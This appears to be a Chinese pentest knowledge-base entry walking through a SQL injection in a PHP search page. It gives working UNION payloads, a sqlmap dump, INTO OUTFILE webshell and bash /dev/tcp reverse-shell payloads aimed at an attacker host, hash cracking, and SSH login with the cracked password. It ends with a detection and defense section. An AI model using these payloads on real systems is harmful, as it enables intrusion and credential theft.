---
id: web-generic-sqli-php-like-double-quote-union-outfile
title: PHP 搜索接口 LIKE "%$word%" 双引号拼接注入：UNION 拖库、INTO OUTFILE 写 Webshell/反弹 Shell
type: scenario
domain: web
path: web/generic/sqli
technique: php-like-double-quote-sqli-union-outfile
tags:
- sqli
- php
- mysql
- like
- union
- into-outfile
- webshell
- reverse-shell
- md5
- credential-reuse
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V76
  verified_at: '2026-11-05T16:38:09+08:00'
  notes: 已对照原文与 img/19-33 核对：img/22 双引号闭合报 SQL 语法错误；img/23 UNION 取到 ramses 的 base64(MD5) YzZk...；img/24 base64 -d 得 c6d6bd...，img/25/26 john 破出 omega；img/27 ssh ramses -p777 成功；img/28 sqlmap dump seth.users；img/29/32 OUTFILE 写 2.php 与 reverse.php，img/32 反弹得到 www-data Shell；img/30 源码硬编码 root/sunnyvale，img/33 登录数据库。PoC 未在本机执行；无 CVE/版本信息，未设 affected_versions。
url: /docs/web/generic/sqli/web-generic-sqli-php-like-double-quote-union-outfile/
draft: false
kb_aliases:
- LIKE "%$word%" 注入
- 420search.php SQL 注入
- NullByte SQL 注入
- 双引号闭合 UNION 注入
- INTO OUTFILE 写马
- SQL 注入反弹 shell
- base64 编码 MD5 口令
---

## 一句话结论

PHP 搜索接口把用户输入直接拼进 `LIKE "%$word%"` 的双引号字面量，输入一个 `"` 即可闭合并注入；本文用 UNION 依次取出库名、表名、列名与 `users` 表，拿到 base64 编码的 MD5 口令哈希，再用 `UNION SELECT ... INTO OUTFILE` 在 `/uploads/` 写 Webshell 与反弹 Shell，最终获得 `www-data` shell、数据库 root 口令和 SSH 账户口令。

## 原理

- 漏洞源码（原文从反弹 shell 中读出）：
  ```php
  $word = $_GET["usrtosearch"];
  $sql = 'SELECT id, user, position FROM users WHERE user LIKE "%'.$word.'%" ';
  ```
  输入被直接拼进双引号模式串，`"` 会闭合 `LIKE "%...%"` 的字符串字面量，后面的 `UNION SELECT`/`ORDER BY`/注释符即可改变整条 SQL；外层包 `%` 与双引号并不提供任何转义。
- 注入点位于 `GET /<hidden>/420search.php?usrtosearch=`，页面把查询结果按 `EMP ID/EMP NAME/EMP POSITION` 回显，属于可回显的 UNION 注入，手工即可完成列数探测与数据提取。
- 数据库为 MySQL/MariaDB（`seth` 库），`users` 表的 `pass` 列不是原始 MD5，而是 **base64(MD5)**：`YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE` 先 `base64 -d` 得到 `c6d6bd7ebf806f43c76acc3681703b81`，再按 MD5 破解得到 `omega`。跳过 base64 这一步会误判哈希类型。
- 写文件阶段利用 MySQL `FILE` 权限 + `INTO OUTFILE`：把 PHP 代码作为 UNION 的字符串列写入 `/var/www/html/uploads/2.php`；`uploads` 目录已存在且 Web 可访问，因此直接得到 Webshell。把 payload 换成 `exec("/bin/bash -c 'bash -i >& /dev/tcp/...'")` 写到 `reverse.php`，访问即反弹 shell。
- 为什么能升级：Web 进程用户 `www-data` 可读同目录的 `420search.php` 源码，源码中硬编码数据库 `root/sunnyvale`；同一口令还可复用到 SSH 账户 `ramses`（端口 777），从 Web 注入扩展到系统 shell。
- `INTO OUTFILE` 要求数据库账号有 `FILE` 权限、`secure_file_priv` 允许目标目录、目录对 mysqld 可写且文件不存在；本文这些条件均满足。

## 触发条件

- 搜索/列表接口把输入拼进 `LIKE "%...%"`（双引号）或其他字符串字面量，未参数化、未转义。
- 注入点可回显查询结果，支持 `UNION SELECT`（或至少报错/盲注）。
- 数据库账号具备 `FILE` 权限，`secure_file_priv` 允许写入 Web 目录，且已知 Web 根路径。
- Web 目录存在可写、可访问的上传目录（本文 `/uploads/`）。
- 数据库口令或哈希可破解/复用，且目标开放 SSH 等远程登录。

## 利用步骤

1. 确认注入：对 `usrtosearch` 依次提交 `a`、`"`、`" order by 1;-- -`、`" order by 3;-- -`、`" order by 4;-- -`，观察回显/报错与列数。
2. 手工 UNION 提取：
   ```sql
   " union select 1,2,3;-- -
   " union select database(),user(),version();-- -
   " union select table_schema,table_name,3 from information_schema.tables;-- -
   " union select column_name,2,3 from information_schema.columns where table_schema='seth' and table_name='users';-- -
   " union select user,pass,position from users;-- -
   ```
3. 处理口令：把 `pass` 值做 `base64 -d`，再按 MD5 用 john/hashcat 破解；本文得到 `omega`。
4. 用 sqlmap 复核/拖库：
   ```bash
   sqlmap -u "http://target/kzMb5nVYJw/420search.php?usrtosearch=1" \
     -D seth -T users --dump
   ```
5. 写 Webshell：
   ```sql
   " union select '<?php eval($_REQUEST[1]);?>','','' into outfile '/var/www/html/uploads/2.php' -- -
   ```
   访问 `http://target/uploads/2.php?1=system("id");` 验证。
6. 读源码/getshell 后写反弹 Shell：
   ```sql
   " union select "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/<attacker>/7777 0>&1'\");?>","","" into outfile '/var/www/html/uploads/reverse.php' -- -
   ```
   本机 `nc -lvnp 7777`，访问 `/uploads/reverse.php` 得到 `www-data` shell。
7. 从 `420search.php` 源码读取数据库口令（本文 `root/sunnyvale`），登录 MySQL；用破解出的 `omega` 尝试 SSH `ramses@target -p777`，成功登录后继续本地提权。

## PoC

```http
GET /kzMb5nVYJw/420search.php?usrtosearch="%20union%20select%20user,pass,position%20from%20users%3B--%20- HTTP/1.1
Host: target
```

```text
EMP ID : ramses
EMP NAME : YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE
EMP POSITION :
```

```bash
echo -n YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | base64 -d
# c6d6bd7ebf806f43c76acc3681703b81
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# omega

ssh ramses@target -p777
```

```sql
" union select '<?php eval($_REQUEST[1]);?>','','' into outfile '/var/www/html/uploads/2.php' -- -
" union select "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER/7777 0>&1'\");?>","","" into outfile '/var/www/html/uploads/reverse.php' -- -
```

说明：原文完整展示了手工 UNION 回显、sqlmap dump、两种 OUTFILE 写文件、反弹 shell、源码读取数据库口令与 SSH 登录 `ramses/omega`；PoC 未在本机复跑。

## 变体与关联

- **引号变体**：单引号拼接用 `'` 闭合；数字型可省引号；`LIKE` 的 `%` 只是模式字符，不阻止注入。参见 [[web-generic-sqli-like-clause-append-search]]。
- **写文件变体**：`INTO DUMPFILE` 适合单行无转义 payload；`secure_file_priv` 受限时改用 `general_log`/`slow_query_log`；详见 [[web-generic-sqli-mysql-outfile-general-log-webshell]]。
- **哈希变体**：口令可能经过 base64/hex/多重编码；先解码再识别。MD5 快哈希可在线反查或 `john --format=raw-md5`；关联 [[pentest-lateral-movement-web-sqlite-db-md5-ssh-reuse]]、[[pentest-lateral-movement-sqli-dump-sha256-crack-domain-credential-reuse]]。
- **横向变体**：数据库配置文件常含 `dbuser/dbpass`，可登录 MySQL、复用至 SSH/其他服务；本文即用同口令登录 `ramses`。
- **边界**：无 `FILE` 权限、`secure_file_priv=NULL`、上传目录不解析 PHP、数据库与 Web 分离、或口令不复用时，写马/横向失败，但仍可拖库。

## 检测与防御

- **检测**：搜索参数中出现双引号、`UNION`、`ORDER BY`、`information_schema`、注释符；响应中出现 SQL 语法错误或异常大量 `EMP` 记录。
- **检测**：MySQL 日志出现 `INTO OUTFILE`、`information_schema` 枚举；Web 目录新增 `.php` 文件；`uploads` 目录出现可执行脚本。
- **检测**：SSH 登录使用数据库/应用口令；同一来源先访问 Web 注入点，再登录 SSH。
- **防御**：所有 SQL 使用预处理语句；`LIKE` 用 `CONCAT('%', ?, '%')` 绑定参数，禁止字符串拼接；控制器对搜索参数做长度/字符白名单。
- **加固**：数据库账号最小权限，业务账号不授予 `FILE`；`secure_file_priv` 设为固定目录或 `NULL`；上传目录禁止脚本执行（`php_admin_flag engine off`/`RemoveHandler`）。
- **响应**：删除异常 webshell、轮换数据库与 SSH 口令、审计源码泄露的凭据、排查数据库导出与反弹 shell 出站连接。
